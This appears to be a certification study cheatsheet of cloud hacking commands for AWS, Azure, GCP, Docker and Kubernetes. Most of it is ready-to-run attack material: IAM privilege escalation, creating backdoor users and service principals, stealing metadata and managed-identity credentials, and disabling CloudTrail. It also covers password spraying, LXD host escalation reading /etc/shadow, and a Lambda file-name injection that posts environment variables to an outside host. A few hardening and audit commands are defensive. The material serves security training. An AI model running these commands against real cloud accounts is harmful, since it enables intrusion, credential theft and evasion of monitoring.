# Cloud Hacking — Master Commands Cheatsheet

> **CEH v13 Module 19 | Every runnable command from the module**

---

## Reconnaissance & Information Gathering

### Shodan Search Filters

```
# Find HTTPS services (common for cloud web services)
port:443

# Find AWS services via SSL certificate issuer
ssl.cert.issuer.cn:Amazon

# Find AWS services via organization
org:Amazon

# Find Azure-hosted services
ssl.cert.subject.cn:azure

# Find any cloud asset (enterprise Shodan only)
tag:cloud

# Find assets within a common AWS IP range
net:52.0.0.0/8

# Find instances where HTML mentions S3
http.html:"s3.amazonaws.com"

# Find AWS infrastructure used by a target
Amazon web services Facebook

# Search AWS-hosted services
org:Amazon

# Search in Shodan for a host
shodan.io/host/3.92.2.83
```

### Masscan — Port Scanning

```bash
# Scan all ports on target IP at a specific rate
sudo masscan -p0-65535 <target_IP_address> --rate=<rate>

# Save results as XML
sudo masscan -p0-65535 <target_IP_address> --rate=<rate> -oX <scan_results>.xml

# Save results as JSON
sudo masscan -p0-65535 <target_IP_address> --rate=<rate> -oJ scan_results.json
```

---

## AWS Commands

### S3 Bucket Enumeration

#### S3Scanner

```bash
# Scan a single bucket
s3scanner -bucket <filename>

# Scan all bucket names in a file (with enumeration)
s3scanner -bucket-file <filename>.txt -enumerate

# Scan using a names file
s3scanner -bucket-file names.txt

# Scan with eight threads
s3scanner -bucket <filename> -threads 8
```

#### BucketLoot

```bash
# List publicly accessible buckets
python bucketloot.py -l <file_with_bucket_names>

# Check permissions of listed buckets
python bucketloot.py -c <file_with_bucket_names>

# Download data from publicly accessible buckets
python bucketloot.py -d <file_with_bucket_names>
```

#### CloudBrute

```bash
# Navigate to CloudBrute directory
cd CLoudbrute

# Enumerate target S3 buckets
./cloudbrute -d <target.com> -k <keyword> -t 80 -T 10 -w /<path_to_wordlist>.txt

# For Azure storage use -d microsoft.com
./cloudbrute -d microsoft.com -k <keyword> -t 80 -T 10 -w /<path_to_wordlist>.txt

# For GCP storage use -d google.com
./cloudbrute -d google.com -k <keyword> -t 80 -T 10 -w /<path_to_wordlist>.txt
```

#### Google Dorks for S3

```
inurl:s3.amazonaws.com
inurl:s3.amazonaws.com/audio/
inurl:s3.amazonaws.com/video/
site:s3.amazonaws.com inurl:facebook
site:s3.amazonaws.com intitle:facebook
inurl:"s3.amazonaws.com" intext:"facebook"
```

### Exploiting S3 Buckets

```bash
# Configure AWS CLI with stolen credentials
aws configure

# List all S3 buckets
aws s3 ls --profile stolen_profile

# List contents of a specific bucket (no authentication)
aws s3 ls s3://[bucket_name] --no-sign-request

# Read files (list bucket contents)
aws s3 ls s3://[bucket_name] --no-sign-request

# Move files into a bucket
aws s3 mv FileName s3://[bucket_name]/test-file.txt --no-sign-request

# Copy files into a bucket
aws s3 cp FileName s3://[bucket_name]/test-file.svg --no-sign-request

# Delete files from a bucket
aws s3 rm s3://[bucket_name]/test-file.svg --no-sign-request

# Sync all bucket data locally
aws s3 sync s3://bucket-name /home/attacker/localstash/targetcloud/ --profile stolen_profile
```

### EC2 Enumeration

```bash
# List EC2 instances
aws ec2 describe-instances

# Check for IMDSv1 (metadata without token — easier to exploit)
aws ec2 describe-instances --filters Name=metadata-options.http-tokens,Values=optional

# Extract user data (often contains secrets)
aws ec2 describe-instance-attribute \
  --instance-id <id> \
  --attribute userData \
  --output text \
  --query "UserData.Value" | base64 --decode

# List volumes
aws ec2 describe-volumes

# List security groups
aws ec2 describe-security-groups

# Find security groups allowing SSH from the internet
aws ec2 describe-security-groups \
  --filters \
  Name=ip-permission.from-port,Values=22 \
  Name=ip-permission.to-port,Values=22 \
  Name=ip-permission.cidr,Values='0.0.0.0/0'

# List open security groups exposed to the internet
aws ec2 describe-security-groups \
  --filter Name=ip-permission.cidr,Values=0.0.0.0/0,::/0

# Grant unrestricted access to a port (backdoor)
aws ec2 authorize-security-group-ingress \
  --group-id <security group ID> \
  --protocol <protocol> \
  --port <port number> \
  --cidr 0.0.0.0/0

# List key pairs
aws ec2 describe-key-pairs

# List VPCs, subnets, gateways
aws ec2 describe-vpcs
aws ec2 describe-subnets
aws ec2 describe-internet-gateways
aws ec2 describe-nat-gateways
aws ec2 describe-transit-gateways
aws ec2 describe-vpc-endpoints
aws ec2 describe-vpc-peering-connections

# Enumerate all AWS regions
aws ec2 describe-regions
```

### RDS Enumeration

```bash
# List all RDS instances
aws rds describe-db-instances

# Describe a specific RDS instance
aws rds describe-db-instances --db-instance-identifier mydbinstancecf

# List DB security groups
aws rds describe-db-security-groups

# List automated backups
aws rds describe-db-instance-automated-backups

# List DB snapshots
aws rds describe-db-snapshots

# List public snapshots
aws rds describe-db-snapshots --include-public --snapshot-type public
```

### IAM Enumeration & Exploitation

```bash
# List predefined/custom roles
aws iam list-roles

# Get details on a specific role (including trust policy)
aws iam get-role --role-name <role-name>

# List attached policies for a user
aws iam list-attached-user-policies --user-name <username>

# List attached policies for a role
aws iam list-attached-role-policies --role-name <role-name>

# Export IAM policies for analysis (Cloudsplaining input)
aws iam get-account-authorization-details --output json > account-auth-details.json

# Analyze IAM policies with Cloudsplaining
cloudsplaining scan --input-file account-auth-details.json --output ./cloudsplaining-report

# Assume a role (lateral movement)
aws sts assume-role \
  --role-arn arn:aws:iam::<target-account-id>:role/<Role Name> \
  --role-session-name <session name>

# Verify assumed role identity
aws sts get-caller-identity --profile stolen_profile

# Set environment variables for assumed role
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<SessionToken>
```

#### IAM Privilege Escalation Commands

```bash
# Technique 1: Create new policy version with admin permissions
aws iam create-policy-version \
  --policy-arn <PolicyArn> \
  --policy-document file://admin-policy.json \
  --set-as-default

# Technique 2: Set default policy version to an old permissive version
aws iam set-default-policy-version \
  --policy-arn <PolicyArn> \
  --version-id v1

# Technique 3: Create EC2 instance with existing instance profile
aws ec2 run-instances \
  --image-id <ami-id> \
  --instance-type t2.micro \
  --iam-instance-profile Name=<profile-name>

# Technique 4: Create a new access key for another user
aws iam create-access-key --user-name <username>

# Technique 5: Create a login profile for another user
aws iam create-login-profile --user-name <username> --password <password>

# Update an existing login profile (change password)
aws iam update-login-profile --user-name <username> --password <new-password>

# Technique 6: Attach admin policy to a user
aws iam attach-user-policy \
  --user-name <username> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Attach admin policy to a group
aws iam attach-group-policy \
  --group-name <groupname> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Attach admin policy to a role
aws iam attach-role-policy \
  --role-name <rolename> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Technique 7: Create inline policy for user (admin access)
aws iam put-user-policy \
  --user-name <username> \
  --policy-name admin \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'

# Technique 8: Add a user to an admin group
aws iam add-user-to-group --user-name <username> --group-name <admin-group>
```

#### Creating Backdoor IAM Users

```bash
# Step 1: Create new IAM user
aws iam create-user --user-name <Username>

# Step 2: Attach admin policy
aws iam attach-user-policy \
  --user-name <Username> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Step 3: Create access keys
aws iam create-access-key --user-name <Username>
```

### IMDS (Metadata Service) Credential Theft

```bash
# IMDSv1 — List roles on an EC2 instance
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv1 — Retrieve credentials for a specific role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM-Role-Name>

# IMDSv2 — Step 1: Get a session token
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`

# IMDSv2 — Step 2: Use the token in requests
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  -v http://169.254.169.254/latest/meta-data/
```

### SSRF-Based Credential Theft

```bash
# After obtaining stolen credentials via SSRF, add to aws-cli
aws configure

# Verify the stolen credentials work
aws sts get-caller-identity --profile stolen_profile

# List all buckets accessible to stolen account
aws s3 ls --profile stolen_profile

# Sync all bucket data locally
aws s3 sync s3://bucket-name /home/attacker/localstash/targetcloud/ \
  --profile stolen_profile
```

### Cognito Enumeration

```bash
# List user pools
aws cognito-idp list-user-pools

# View details of a specific user pool
aws cognito-idp describe-user-pool --user-pool-id <UserPoolId>

# List identity pools
aws cognito-identity list-identity-pools

# View details of a specific identity pool
aws cognito-identity describe-identity-pool --identity-pool-id <IdentityPoolId>

# Check if a username exists (by attempting sign-up)
aws cognito-idp sign-up \
  --client-id <ClientId> \
  --username <username> \
  --password <password> \
  --user-attributes Name=email,Value=<email>
```

### Lambda Enumeration & Exploitation

```bash
# List all Lambda functions
aws lambda list-functions

# Get info about a specific function
aws lambda get-function --function-name <function_name>

# Get configuration details (including environment variables)
aws lambda get-function-configuration --function-name <function_name>

# List exposed URLs of a Lambda function
aws lambda list-function-url-configs --function-name <function_name>

# Get URL configs
aws lambda get-function-url-config --function-name <function_name>

# List event sources that trigger the function
aws lambda list-event-source-mappings --function-name <function_name>

# Black-box Lambda attack — list bucket objects
aws s3 ls prod-file-bucket-eu

# Check object tags for sensitive info
aws s3api get-object-tagging --bucket prod-file-bucket-eu --key config161.zip

# Exploit: Create new connection to another EC2 and extract env vars
aws s3 cp config.zip 's3://prod-file-bucket-eu/screen;curl -X POST -d "`env`" <Target IP>:443;.zip'

# White-box Lambda attack — check user policies
aws iam list-attached-user-policies --user-name operator

# White-box — get Lambda function details
aws lambda get-function --function-name corpFuncEasy
```

### CloudTrail Evasion

```bash
# Stop logging
aws cloudtrail stop-logging \
  --name targetcloud_trail \
  --profile administrator

# Check trail status
aws cloudtrail get-trail-status \
  --name targetcloud_trail \
  --profile administrator

# Re-enable logging (post-attack cleanup)
aws cloudtrail start-logging \
  --name targetcloud_trail \
  --profile administrator

# Permanently delete the trail
aws cloudtrail delete-trail \
  --name targetcloud_trail \
  --profile administrator

# Delete the S3 bucket storing the trail logs
aws s3 rb s3://<Bucket_Name> --force --profile administrator
```

### EC2 Persistence

```bash
# SSH Key Injection
echo "ssh-rsa AAAAB3... attacker_key" >> ~/.ssh/authorized_keys

# Add malicious startup script
echo "/path/to/malicious/script.sh" >> /etc/rc.local
chmod +x /path/to/malicious/script.sh

# Create IAM backdoor role
aws iam create-role \
  --role-name <Role-Name> \
  --assume-role-policy-document file://Test-Role-Trust-Policy.json

aws iam attach-role-policy \
  --role-name <Role-Name> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### Cartography — Neo4j Attack Path Queries

```cypher
# Find RDS instances
MATCH (aws:AWSAccount)-[r:RESOURCE]->(rds:RDSInstance) return *

# Find unencrypted RDS instances
MATCH (a:AWSAccount)-[:RESOURCE]->(rds:RDSInstance{storage_encrypted:false})
RETURN a.name, rds.id

# Find internet-exposed EC2 instances
MATCH (instance:EC2Instance{exposed_internet:true})
RETURN instance.instanceid, instance.publicdnsname
```

### CloudFox

```bash
# Run all checks
cloudfox aws --profile <profile-name> all-checks

# Enumerate access keys
cloudfox aws --profile <profile-name> -v2 access-keys

# Enumerate S3 buckets
cloudfox aws --profile <profile-name> -v2 buckets

# Enumerate ECS tasks
cloudfox aws --profile <profile-name> ecs-tasks -v2

# Enumerate elastic network interfaces
cloudfox aws -p <profile-name> eni -v2

# Enumerate endpoints
cloudfox aws --profile <profile-name> -v2 endpoints

# List IAM permissions
cloudfox aws --profile <profile-name> permissions -v2

# Enumerate secrets
cloudfox aws --profile <profile-name> -v2 secrets

# Enumerate workloads
cloudfox aws --profile <profile-name> workloads
```

### Ghostbuster — DNS Enumeration

```bash
# Enumerate DNS records for a targeted AWS account
ghostbuster scan aws --profile <AWS CLI profile name>
```

### Serverless Resource Enumeration

```bash
# List Lambda functions
aws lambda list-functions

# List DynamoDB tables
aws dynamodb list-tables

# Describe a DynamoDB table
aws dynamodb describe-table --table-name <table_name>

# List global DynamoDB tables
aws dynamodb list-global-tables

# List API Gateway REST APIs
aws apigateway get-rest-apis

# Get info about a specific REST API
aws apigateway get-rest-api --rest-api-id <api_id>
```

### Stratus Red Team — Threat Emulation

```bash
# Set up AWS profile
export AWS_PROFILE=my-profile

# Authenticate to AWS
aws-vault exec sandbox-account

# List attack techniques for a specific MITRE ATT&CK tactic
stratus list --platform AWS --mitre-attack-tactic persistence

# View attack technique details
stratus show <Attack technique>

# Warm up (create prerequisite infrastructure)
stratus warmup <Attack technique>

# Detonate the attack
stratus detonate <Attack technique>

# Check attack status
stratus status

# Clean up
stratus cleanup <Attack technique>
stratus cleanup --all
```

### Pacu — IAM Role Hijacking

```bash
# Assume roles via brute force
assume_role_enum.py [-h] [-p PROFILE] [-w WORD_LIST] -I ACCOUNT_ID
```

### DumpsterDiver — Secret Scanning

```bash
# Scan a directory for secrets
dumpsterDiver -p /path/to/scan

# Scan specifically for AWS keys
dumpsterDiver -p /path/to/scan -e AWS_KEY

# Full syntax
DumpsterDiver.py -p LOCAL_PATH [-r] [-a] [-s] [-l [0,3]] \
  [-o OUTFILE] [--min-key MIN_KEY] [--max-key MAX_KEY] \
  [--entropy ENTROPY] [--min-pass MIN_PASS] [--max-pass MAX_PASS] \
  [--pass-complex {1,2,3,4,5,6,7,8,9}] \
  [--grep-words GREP_WORDS ...] \
  [--exclude-files EXCLUDE_FILES ...] \
  [--bad-expressions BAD_EXPRESSIONS ...]
```

### Endgame — Backdoor Creation

```bash
# List IAM resources
endgame list-resources -s iam

# List S3 buckets
endgame list-resources --service s3

# List all resources across services
endgame list-resources --service all

# Create a backdoor resource exposure
endgame expose --service iam --name test-resource-exposure
```

### Prowler — Vulnerability Scanning

```bash
# Basic scan
prowler <provider>

# Generate report (CSV, JSON, HTML)
prowler <provider> -M csv json-asff json-ocsf html

# Specific checks
prowler azure --checks storage_blob_public_access_level_is_disabled
prowler aws --services s3 ec2
prowler gcp --services iam compute
prowler kubernetes --services etcd apiserver

# AWS with profile and region filter
prowler aws --profile custom-profile --filter-region <region_1> <region_2>

# Azure with subscription filter
prowler azure --az-cli-auth --subscription-ids <sub_ID_1> <sub_ID_2>

# GCP with project filter
prowler gcp --project-ids <Project_ID_1> <Project_ID_2>
```

### CloudSploit — Misconfiguration Detection

```bash
# Standard scan
./index.js

# HIPAA compliance scan
./index.js --compliance=hipaa

# PCI compliance scan
./index.js --compliance=pci

# CIS Benchmarks scan
./index.js --compliance=cis

# Plain text console output
./index.js --console=text

# Console output + CSV file
./index.js --csv=file.csv --console=table
```

### Cloudsplaining — Weak IAM Policy Detection

```bash
# Export IAM data
aws iam get-account-authorization-details --output json > account-auth-details.json

# Scan for weak IAM policies
cloudsplaining scan --input-file account-auth-details.json --output ./cloudsplaining-report
```

---

## Azure Commands

### AADInternals — Tenant Reconnaissance

```powershell
# Start tenant reconnaissance
Invoke-AADIntReconAsOutsider -Domain <domain name> | Format-Table

# Get login information for a domain
Get-AADIntLoginInformation -Domain <domain name>

# Get all tenant domains
Get-AADIntTenantDomains -Domain <domain name>

# Get endpoint instances
Get-AADIntEndpointInstances

# Get endpoint IPs
Get-AADIntEndpointIps -Instance WorldWide

# Get tenant details
Get-AADIntTenantDetails -Domain <domain name>

# Get Kerberos domain sync config
Get-AADIntKerberosDomainSyncConfig -AccessToken

# Recon as insider
Invoke-AADIntReconAsInsider

# Get OpenID configuration
Get-AADIntOpenIDConfiguration -Domain <domain name>

# Get service locations
Get-AADIntServiceLocations | Format-Table

# Get service plans
Get-AADIntServicePlans | Format-Table

# Get subscriptions
Get-AADIntSubscriptions

# Get company tags
Get-AADIntCompanyTags -Domain <domain name>

# Get sync configuration
Get-AADIntSyncConfiguration

# Get tenant auth policy
Get-AADIntTenantAuthPolicy

# Get Azure AD policies
Get-AADIntAzureADPolicies
```

### MicroBurst — Azure Resource Enumeration

```powershell
# Import module
Import-Module .\MicroBurst.psm1

# Create output folder
New-Item -Name "microburst_output" -ItemType "directory"

# Run enumeration
Get-AzDomainInfo -Verbose -Folder microburst-output

# Open output folder
explorer microburst-output
```

### AzureGraph — Azure AD Account Enumeration

```r
# Authenticate and create login session
gr <- create_graph_login()

# List all users in Azure AD tenant
gr$list_users()

# Get info about the authenticated user
me <- gr$get_user("username")

# View group memberships
head(me$list_group_memberships())

# List owned applications
me$list_owned_objects(type="application_name")
```

### AzureHound — BloodHound Data Collection

```bash
# Collect data and print to stdout
azurehound list -u "$USERNAME" -p "$PASSWORD" -t "$TENANT"

# Collect data and save to JSON
azurehound list -u "$USERNAME" -p "$PASSWORD" -t "$TENANT" -o "mytenant.json"

# Start BloodHound data collection service
azurehound configure
azurehound start
```

### Spray365 — Azure AD Password Spraying

```bash
# Generate execution plan
python spray365.py generate normal \
  -ep <execution_plan_filename> \
  -d <domain_name> \
  -u <file_containing_usernames> \
  -pf <file_containing_passwords>

# Execute spray
python3 spray365.py spray -ep <execution_plan_filename>

# Review results
python3 spray365.py review <spray_results_json_filename>
```

### Stormspotter — Attack Surface Mapping

```bash
# CLI mode (uses current Azure CLI auth)
python3 sscollector.pyz cli

# Service Principal mode
python3 sscollector.pyz spn -t <tenant> -c <clientID> -s <clientSecret>
```

### Goblob — Azure Blob Storage Enumeration

```bash
# Enumerate a single storage account
./goblob <storageaccountname>

# Enumerate multiple accounts
./goblob -accounts accounts.txt

# Use custom container name wordlist
./goblob -accounts accounts.txt -containers wordlists/goblob-folder-names.txt

# Save results to file
./goblob -accounts accounts.txt -containers wordlists/goblob-folder-names.txt -output results.txt
```

### Azure NSG Identification

```bash
# List all NSGs
az network nsg list --out table

# View details of a specific NSG
az network nsg show --resource-group <ResourceGroupName> --name <NSGName>

# List security rules in an NSG
az network nsg rule list \
  --resource-group <ResourceGroupName> \
  --nsg-name <NSGName> \
  --output table

# Filter to inbound rules open to any source IP
az network nsg rule list \
  --resource-group <ResourceGroupName> \
  --nsg-name <NSGName> \
  --query "[?direction=='Inbound' && sourceAddressPrefix=='*']" \
  --output table
```

### Azure Managed Identity Exploitation

```bash
# Steal access token via command injection in Azure Function
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" \
  -H secret:$IDENTITY_HEADER

# Authenticate with stolen token
Install-Module -Name Az -Repository PSGallery -Force
Connect-AzAccount -AccessToken <access_token> -AccountId <client_id>

# List accessible resources
Get-AzResource

# Get storage account keys
Get-AzStorageAccountKey -ResourceGroupName "<resource_group>" -AccountName "<account_name>"
```

### Azure AD Privilege Escalation via Certificate

```powershell
# Connect as normal user
Connect-AzureAD

# Create certificate credential
$pwd = <password>
$path = <thumbprint>
Export-PfxCertificate -cert $path -FilePath <path_to_save_.pfx_file> -Password $pwd

# Connect with certificate and escalate to Global Admin
Connect-AzureAD -TenantId <tenant_id> -ApplicationId <app_id> -CertificateThumbPrint <thumbprint>
Add-AzureADDirectoryRoleMember -RefObjectId <normaluser_object_ID> -ObjectId <GlobalAdmin_ID>
```

### Azure Service Principal Backdoors

```bash
# Create service principal
az ad sp create-for-rbac --name <service-principal-name>

# Assign Owner role
az role assignment create --assignee <service-principal-id> --role "Owner"

# Verify assignment
az role assignment list --assignee <service-principal-id> --output table

# Rotate credentials to avoid detection
az ad sp credential reset --name <service-principal-id>
```

### VNet Peering Exploitation

```bash
# Create unauthorized peering
az network vnet peering create \
  -g TargetResourceGroup \
  -n AttackerVnetToTargetVnet \
  --vnet-name AttackerVnet \
  --remote-vnet TargetVnetId \
  --allow-vnet-access

# Enable traffic forwarding
az network vnet peering update \
  -g TargetResourceGroup \
  -n AttackerVnetToTargetVnet \
  --vnet-name AttackerVnet \
  --set allowForwardedTraffic=true

# Use target's VPN gateway
az network vnet peering update \
  -g TargetResourceGroup \
  -n AttackerVnetToTargetVnet \
  --vnet-name AttackerVnet \
  --set useRemoteGateways=true

# Delete legitimate peering to disrupt traffic
az network vnet peering delete \
  -g TargetResourceGroup \
  -n TargetVnetToAnotherVnet \
  --vnet-name TargetVnet

# Sync peering configurations
az network vnet peering sync \
  -g TargetResourceGroup \
  -n AttackerVnetToTargetVnet \
  --vnet-name AttackerVnet
```

---

## GCP Commands

### Core gcloud Enumeration

```bash
# List organizations
gcloud organizations list

# List folders in an organization
gcloud resource-manager folders list --organization=<organization_id>

# List projects
gcloud projects list

# List all storage buckets
gsutil ls

# List buckets in a specific project
gsutil ls -p <project_id>

# Get bucket permissions
gsutil iam get gs://<bucket_name>

# List bucket contents
gsutil ls gs://<bucket_name>

# Recursively list bucket contents
gsutil ls -r gs://<bucket_name>

# List service accounts
gcloud iam service-accounts list

# Find all roles bound to a service account
gcloud projects get-iam-policy <project-id> \
  --flatten="bindings[].members" \
  --format='table(bindings.role)' \
  --filter="bindings.members:service_account_email"

# Get access token for a service account (impersonation)
gcloud auth print-access-token --impersonate-service-account=<service-account-email>

# List IAM roles
gcloud iam roles list [--show-deleted] [--organization=<organization>] [--project=<project_id>]

# Describe a role
gcloud iam roles describe <role_id>

# Get org-level IAM policy
gcloud organizations get-iam-policy <organization_id>

# Get project-level IAM policy
gcloud projects get-iam-policy <project_id>

# Get folder-level IAM policy
gcloud resource-manager folders get-iam-policy <folder_id>

# List Compute Engine instances
gcloud compute instances list

# Describe a VM
gcloud compute instances describe <instance> --zone <zone>

# Get VM service account scopes
gcloud compute instances describe INSTANCE_NAME \
  --zone=<zone> \
  --format="table(serviceAccounts.scopes)"

# List Cloud SQL instances
gcloud sql instances list

# List SQL databases
gcloud sql databases list --instance=<instance_name>
```

### GCP Scanner

```bash
# Enumerate GCP resources and permissions
python3 scanner.py -o <output file> -g <Gcloud profile path>
```

### gcp_service_enum

```bash
# Enumerate GCP services using a service account key
gcp_enum_services.py -f <service account key file> --output-file <output file>
```

### cloud_enum — Multi-Cloud OSINT

```bash
# Enumerate GCP storage buckets (disable other clouds for speed)
cloud_enum.py -k <keyword> --disable-aws --disable-azure
```

### GCP Privilege Escalation Scanner

```bash
# Step 1: List all permissions per member
python3 enumerate_member_permissions.py --project-id test-<project ID>

# Step 2: Scan for privilege escalation vulnerabilities
python3 check_for_privesc.py
```

### GCPBucketBrute

```bash
# Scan for bucket permissions and privilege escalation
python3 gcpbucketbrute.py -k testtest -a
```

### GCP IAM Backdoor (Post-Exploitation)

```bash
# Create new role with elevated permissions
gcloud iam roles create <ROLE_NAME> \
  --project=<PROJECT_ID> \
  --file=role-definition.yaml

# Bind role to service account for persistent access
gcloud projects add-iam-policy-binding <PROJECT_ID> \
  --member=serviceAccount:<SERVICE_ACCOUNT>@<PROJECT_ID>.iam.gserviceaccount.com \
  --role=roles/<ROLE_NAME>
```

---

## Container Commands

### kubectl Enumeration

```bash
# List all pods
kubectl get pods

# Describe a specific pod
kubectl describe pod <pod-name>

# View pod logs
kubectl logs <pod-name>

# List all services
kubectl get services

# Describe services
kubectl describe services

# List deployments
kubectl get deployment

# Describe a deployment
kubectl describe deployment <deployment-name>

# List service accounts
kubectl get serviceaccounts

# Describe service accounts
kubectl describe serviceaccounts
```

### Docker Registry Enumeration

```bash
# Log in to a registry
docker login <registry-url>

# List Docker Hub repositories for a user
curl -s https://hub.docker.com/v2/repositories/<username>/

# List images in a registry
curl -u <username>:<password> https://<registry-url>/v2/_catalog

# List tags for an image
curl -u <username>:<password> https://<registry-url>/v2/<image-name>/tags/list
```

### Trivy — Container Vulnerability Scanning

```bash
# Scan a container image
trivy image nginx:latest

# Scan with specific scanners
trivy image --scanners vuln alpine:3.15

# Scan a local filesystem
trivy fs /path/to/project

# Scan a git repository
trivy repo github.com/owner/repo
```

### Docker Remote API Exploitation

```bash
# Pull a Docker image
docker -H <Remote IP:Port> pull alpine

# Create and run a container
docker -H <Remote IP:Port> run -t -d alpine

# Execute a command in the container (list files)
docker -H <Remote IP:Port> exec modest_goldstine ls

# Inspect a container (find mounts, env vars)
docker -H [docker remote host] inspect [container name]

# Dump all environment variables (including credentials)
docker -H [docker remote host] exec -i [container name] env

# Scan internal network using Nmap via Docker
docker -H <docker-host> run --network=host --rm marsmensch/nmap -oX <IP Range>

# Find MySQL containers
docker -H [docker remote host] ps | grep mysql

# Retrieve MySQL credentials from environment
docker -H [docker remote host] exec -i some-mysql env

# List databases using stolen credentials
docker -H [docker remote host] exec -i some-mysql mysql -u root -p <password> -e "show databases"
```

### LXD/LXC Privilege Escalation

```bash
# Check group membership first
id

# Step 1: Create Alpine container image
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Step 2: Build image
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18

# Step 3: Import image into LXD
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Step 4: Verify image
lxc image list

# Step 5: Create privileged container
lxc init alpine privesc -c security.privileged=true

# Step 6: List containers
lxc list

# Step 7: Mount host filesystem into container
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

# Step 8: Start container
lxc start privesc

# Step 9: Execute shell (host / available at /mnt/root)
lxc exec privesc /bin/sh

# Browse host filesystem
ls /mnt/root/
cat /mnt/root/etc/shadow
```

### Kubernetes etcd Secret Extraction

```bash
# Find etcd server and PKI info
ps -ef | grep apiserver

# List secrets stored in the cluster
ETCDCTL_API=3 ./etcdctl \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/apiserver-etcd-client.crt \
  --key=/etc/kubernetes/pki/apiserver-etcd-client.key \
  --endpoints=https://127.0.0.1:2379 \
  get /registry/ --prefix | grep -a '/registry/secrets/'

# Extract and decode a specific secret
ETCDCTL_API=3 ./etcdctl \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/apiserver-etcd-client.crt \
  --key=/etc/kubernetes/pki/apiserver-etcd-client.key \
  --endpoints=https://127.0.0.1:2379 \
  get /registry/secrets/kube-system/weave-net-token-nmb26 | ./auger decode -o yaml
```

---

## Scout Suite — Multi-Cloud Security Audit

```bash
# Audit AWS
scout aws --profile <your-aws-profile>

# Audit Azure
scout azure \
  --tenant-id <your-tenant-id> \
  --subscription-id <your-subscription-id> \
  --client-id <your-client-id> \
  --client-secret <your-client-secret>

# Audit GCP
scout gcp --service-account-file path/to/your/service-account-key.json

# Audit Kubernetes
scout kubernetes

# Audit DigitalOcean
scout do
```

---

## Docker Security Hardening Commands

```bash
# Run with no new privileges
docker run --security-opt=no-new-privileges <image>

# Drop all capabilities and add only needed ones
docker run --cap-drop all --cap-add NET_BIND_SERVICE <image>

# Run with read-only filesystem
docker run --read-only <image>

# Disable inter-container communication (daemon flag)
dockerd --icc=false

# Limit memory and CPU
docker run --memory="256m" --cpus="0.5" <image>

# Run as non-root user
docker run --user 1001:1001 <image>

# Enable Docker content trust (sign/verify images)
export DOCKER_CONTENT_TRUST=1
```

---

## Quick Reference — Key Port Numbers

| Port | Service |
|------|---------|
| 22 | SSH |
| 80 | HTTP |
| 443 | HTTPS |
| 2375 | Docker Remote API (unencrypted) |
| 2376 | Docker Remote API (TLS) |
| 2379 | Kubernetes etcd |
| 2380 | Kubernetes etcd cluster |
| 6443 | Kubernetes API server |
| 8080 | Kubernetes API server (insecure) |
| 10250 | Kubernetes kubelet API |
| 10255 | Kubernetes kubelet read-only API |
| 3306 | MySQL |
| 5432 | PostgreSQL |

---

## Quick Reference — AWS IAM Permission Requirements

| Attack | Required Permission |
|--------|-------------------|
| Create new policy version | `iam:CreatePolicyVersion` |
| Change default policy version | `iam:SetDefaultPolicyVersion` |
| Create EC2 with instance profile | `iam:PassRole` + `ec2:RunInstances` |
| Create access key for other user | `iam:CreateAccessKey` |
| Create/update login profile | `iam:CreateLoginProfile` / `iam:UpdateLoginProfile` |
| Attach policy to user | `iam:AttachUserPolicy` |
| Attach policy to group | `iam:AttachGroupPolicy` |
| Attach policy to role | `iam:AttachRolePolicy` |
| Create inline user policy | `iam:PutUserPolicy` |
| Create inline group policy | `iam:PutGroupPolicy` |
| Create inline role policy | `iam:PutRolePolicy` |
| Add user to group | `iam:AddUserToGroup` |
| Describe security groups | `ec2:DescribeSecurityGroups` |
| Describe RDS instances | `rds:DescribeDBInstances` |
